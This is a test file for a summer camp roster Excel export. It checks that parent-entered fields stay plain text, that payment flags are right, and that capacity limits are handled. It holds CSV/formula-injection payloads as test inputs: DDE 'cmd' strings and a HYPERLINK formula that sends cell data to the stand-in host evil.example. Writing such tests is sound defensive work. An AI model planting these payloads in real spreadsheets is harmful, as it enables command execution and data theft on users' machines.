// Verifies the camp roster Excel export (src/lib/campRoster.ts):
//   1. parent-controlled text can never become a live spreadsheet formula;
//   2. the "Paid" column says Y only for a verified payment, and released reservations are not listed;
//   3. a week an administrator has authorized above 30 prints every child (no one is cut off at 30).
// Against a real throwaway Postgres and the real ExcelJS output — not a mock.
//
// Run with: DATABASE_URL=postgres://user:pass@localhost:5432/anydb npm run test:xlsx-safety
// (The test creates its own temporary database and drops it afterwards; it refuses to run
// against anything but a local Postgres.)

import ExcelJS from "exceljs";
import { mkdtempSync, rmSync } from "fs";
import { execFileSync } from "child_process";
import { tmpdir } from "os";
import { join } from "path";
import { createTestDatabase } from "./helpers/testdb.mjs";

const testDb = await createTestDatabase();
const { createHarness } = await import("./helpers/harness.mjs");
const h = createHarness();
const { pool, campDb, check, reserveOk, confirmFor, expireHold } = h;
const { buildCampRosterWorkbook } = await import("../../src/lib/campRoster.ts");

const PAYLOADS = {
  fullName: "=cmd|' /C calc'!A1",
  healthInfo: '=HYPERLINK("http://evil.example/leak?x="&A1,"click me")',
  parentName: "+2+3+cmd|' /C notepad'!A1",
  emergencyName: "-2+3",
  secondaryPhone: "@SUM(1+1)",
};

function xmlEscape(s) {
  return s.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&apos;");
}

async function loadWorkbook(path) {
  const wb = await buildCampRosterWorkbook();
  await wb.xlsx.writeFile(path);
  const read = new ExcelJS.Workbook();
  await read.xlsx.readFile(path);
  return read;
}

const dir = mkdtempSync(join(tmpdir(), "xlsx-safety-"));
const outPath = join(dir, "roster.xlsx");

try {
  console.log("=== 1. Formula-injection-shaped fields must stay inert text ===");
  await reserveOk("xlsx", {
    weekIds: ["2027-06-21"],
    parentName: PAYLOADS.parentName,
    secondaryPhone: PAYLOADS.secondaryPhone,
    emergencyName: PAYLOADS.emergencyName,
    children: [{ fullName: PAYLOADS.fullName, dateOfBirth: "2016-01-01", age: "9", healthInfo: PAYLOADS.healthInfo }],
  });

  const wb2 = await loadWorkbook(outPath);
  const ws = wb2.getWorksheet("Jun 21-25");
  const dataRow = ws.getRow(8); // first data row (header is row 7)
  const nameCell = dataRow.getCell(2); // Child's Full Name
  const healthCell = dataRow.getCell(9); // Allergies / Medical Notes

  check("child-name cell type is String, not Formula", nameCell.type !== ExcelJS.ValueType.Formula && nameCell.value === PAYLOADS.fullName);
  check("health-info cell type is String, not Formula", healthCell.type !== ExcelJS.ValueType.Formula && healthCell.value === PAYLOADS.healthInfo);
  check("neither cell exposes a .formula property", !nameCell.formula && !healthCell.formula);

  // Raw OOXML: no cell may be wrapped in a <f> (formula) tag anywhere.
  const sheetXmlFiles = execFileSync("unzip", ["-Z1", outPath]).toString().split("\n").filter((f) => f.startsWith("xl/worksheets/sheet"));
  let hasFormulaTag = false;
  for (const entry of sheetXmlFiles) {
    const xml = execFileSync("unzip", ["-p", outPath, entry]).toString();
    if (xml.includes("<f>") || xml.includes("<f ")) hasFormulaTag = true;
  }
  check("no <f> (formula) tag anywhere in any worksheet XML", !hasFormulaTag);

  const sharedStrings = execFileSync("unzip", ["-p", outPath, "xl/sharedStrings.xml"]).toString();
  check("child-name payload appears verbatim (XML-escaped) inside a <t> text node", sharedStrings.includes(`<t>${xmlEscape(PAYLOADS.fullName)}</t>`));
  check("health-info payload appears verbatim (XML-escaped) inside a <t> text node", sharedStrings.includes(`<t>${xmlEscape(PAYLOADS.healthInfo)}</t>`));

  // The cover sheet is always sheet1 (buildCoverSheet runs first); 2027-06-21 is the first week in
  // content.ts's juniorCamps.weeks, so its tab is sheet2.
  const jun22Sheet = execFileSync("unzip", ["-p", outPath, "xl/worksheets/sheet2.xml"]).toString();
  const cellMatch = jun22Sheet.match(/<c r="B8"[^>]*>/);
  const cellTag = cellMatch ? cellMatch[0] : "";
  const cellRegion = cellMatch ? jun22Sheet.slice(jun22Sheet.indexOf(cellTag), jun22Sheet.indexOf(cellTag) + 120) : "";
  check('child-name cell (B8) is explicitly typed t="s" (shared string) in the OOXML', /t="s"/.test(cellTag) && !/<f[ >]/.test(cellRegion));

  // French names: accents and apostrophes must reach the printed roster intact.
  await reserveOk("accents", {
    weekIds: ["2027-08-16"],
    parentName: "Chantal Côté-Tremblay",
    children: [{ fullName: "Émilie Côté-Bélanger", dateOfBirth: "2016-02-02", age: "10", healthInfo: "allergie aux arachides; EpiPen à l'école" }],
  });
  const wbAccents = await loadWorkbook(outPath);
  const accentSheet = wbAccents.getWorksheet("Aug 16-19");
  check("accented French names and health notes appear in the roster exactly as written",
    accentSheet.getRow(8).getCell(2).value === "Émilie Côté-Bélanger" && accentSheet.getRow(8).getCell(9).value === "allergie aux arachides; EpiPen à l'école",
    `${accentSheet.getRow(8).getCell(2).value} / ${accentSheet.getRow(8).getCell(9).value}`);

  // ---------------------------------------------------------------------------
  console.log("\n=== 2. The Paid column, and who is listed ===");
  const mk = (name, extra = {}) => reserveOk(name, { weekIds: ["2027-06-28"], children: [{ fullName: name, dateOfBirth: "2017-01-01", age: "9", healthInfo: "none" }], ...extra });
  const paidId = await mk("Aa Paid Child");
  const reportedId = await mk("Bb Reported Child");
  await mk("Cc Pending Child"); // stays Awaiting Payment
  const releasedId = await mk("Dd Released Child");
  const expiredId = await mk("Ee Expired Child");
  await confirmFor(paidId);
  await campDb.reportPayment(reportedId);
  await campDb.cancelRegistration(releasedId, "family withdrew", { releaseReason: "owner_cancelled" });
  await expireHold(expiredId, 1);
  await campDb.releaseExpiredReservations();

  const wb3 = await loadWorkbook(outPath);
  const sheet = wb3.getWorksheet("Jun 28-Jul 2");
  const rows = [];
  for (let r = 8; r <= 37; r++) {
    const name = sheet.getRow(r).getCell(2).value;
    if (name) rows.push({ name: String(name), paid: String(sheet.getRow(r).getCell(10).value ?? "") });
  }
  check("exactly the three held reservations are listed, in name order", rows.map((x) => x.name).join("|") === "Aa Paid Child|Bb Reported Child|Cc Pending Child", rows.map((x) => x.name).join("|"));
  check("Paid = Y only for the verified payment; a parent's report or a plain reservation shows N", rows.map((x) => x.paid).join("") === "YNN", rows.map((x) => x.paid).join(","));
  check("released and expired reservations are not on the sheet", !rows.some((x) => /Released|Expired/.test(x.name)));

  // ---------------------------------------------------------------------------
  console.log("\n=== 3. A week authorized above 30 prints every child ===");
  const normal = wb3.getWorksheet("Jul 12-15");
  check("an ordinary week still has the 30 numbered rows (row 37 is number 30; row 38 is empty)", normal.getRow(37).getCell(1).value === 30 && !normal.getRow(38).getCell(1).value);
  check("...and says 'Max 30 campers'", String(normal.getCell("A3").value).includes("Max 30 campers"));

  const auth = await campDb.authorizeWeekCapacity("2027-07-05", 33, "Extra coach confirmed; families on the waiting list");
  check("setup: the administrator authorizes 33 for Jul 5-8", auth.ok);
  for (let i = 0; i < 11; i++) await reserveOk(`big-${i}`, { weekIds: ["2027-07-05"], children: Array.from({ length: 3 }, (_, k) => ({ fullName: `Big${String(i).padStart(2, "0")} Kid${k + 1}`, dateOfBirth: "2016-01-01", age: "10", healthInfo: "none" })) });
  check("setup: the week now holds 33 children", (await pool.query(`SELECT taken_count FROM camp_weeks WHERE id='2027-07-05'`)).rows[0].taken_count === 33);

  const wb4 = await loadWorkbook(outPath);
  const big = wb4.getWorksheet("Jul 5-8");
  const names = [];
  for (let r = 8; r <= 8 + 40; r++) {
    const v = big.getRow(r).getCell(2).value;
    if (v) names.push(String(v));
  }
  check("all 33 children are on the printed sheet (none cut off after 30)", names.length === 33 && new Set(names).size === 33, `${names.length} names`);
  check("the last numbered row is 33, and the sheet says 'Max 33 campers' and 'Registered: 33 of 33'", big.getRow(8 + 32).getCell(1).value === 33 && String(big.getCell("A3").value).includes("Max 33 campers") && String(big.getCell("A4").value) === "Registered: 33 of 33");
  const cover = wb4.getWorksheet("Read Me First");
  const coverText = [];
  cover.eachRow((row) => row.eachCell((c) => coverText.push(String(c.value ?? ""))));
  check("the cover sheet counts it as 33 of 33", coverText.some((t) => t.includes("33 of 33")));
  check("...and no longer claims the data comes from a Google Sheet", !coverText.some((t) => /CampRegistrations sheet/i.test(t)));
} finally {
  rmSync(dir, { recursive: true, force: true });
}

await pool.end();
await testDb.drop();
process.exit(h.finish("xlsx-safety"));
